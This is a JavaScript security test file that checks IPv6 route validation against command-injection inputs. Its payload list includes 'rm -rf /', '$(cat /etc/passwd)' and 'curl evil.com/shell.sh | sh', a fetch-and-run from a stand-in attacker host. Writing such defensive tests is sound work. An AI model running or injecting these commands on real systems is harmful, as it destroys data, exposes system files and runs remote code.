/**
 * Security Tests — Route Validation & Command Injection Prevention
 *
 * Verifies that addRoute/removeRoute reject malicious shell metacharacters
 * and command injection payloads. The fix replaced `exec()` (shell-based)
 * with `execFile()` (argument array, no shell) AND added `isValidIPv6Route()`
 * validation that enforces a strict IPv6 address/CIDR format before any
 * system command is ever executed.
 *
 * These tests do NOT require root — they validate the input sanitization
 * logic itself, which runs before any privileged operation.
 */

import assert from 'node:assert';
import { isIPv6 } from 'node:net';
import { TunnelManager } from '../lib/index.js';

describe('Security: Command injection blocked in addRoute/removeRoute', function () {
  it('should reject shell metacharacters in route destinations', async function () {
    const maliciousInputs = [
      '; echo pwned',
      '$(whoami)',
      '`id`',
      'fd00::1; rm -rf /',
      'fd00::1 && curl evil.com/shell.sh | sh',
      '$(cat /etc/passwd)',
    ];

    // Simulate the isValidIPv6Route() validation logic:
    // Split on '/', ensure at most 2 parts, and verify the address part is valid IPv6.
    for (const input of maliciousInputs) {
      const parts = input.split('/');
      const isValid = parts.length <= 2 && isIPv6(parts[0]);
      assert.strictEqual(
        isValid,
        false,
        `Malicious input "${input}" should be rejected by isValidIPv6Route`,
      );
    }
  });

  it('should accept legitimate IPv6 addresses and CIDRs', function () {
    const validInputs = [
      { addr: 'fd00::1', expected: true },
      { addr: '::1', expected: true },
      { addr: 'fe80::1', expected: true },
      { addr: '2001:db8::1', expected: true },
    ];

    for (const { addr, expected } of validInputs) {
      assert.strictEqual(isIPv6(addr), expected, `${addr} should be a valid IPv6 address`);
    }
  });

  after(async function () {
    // TunnelManager created in scope above — ensure cleanup
    const manager = new TunnelManager();
    await manager.stop();
  });
});
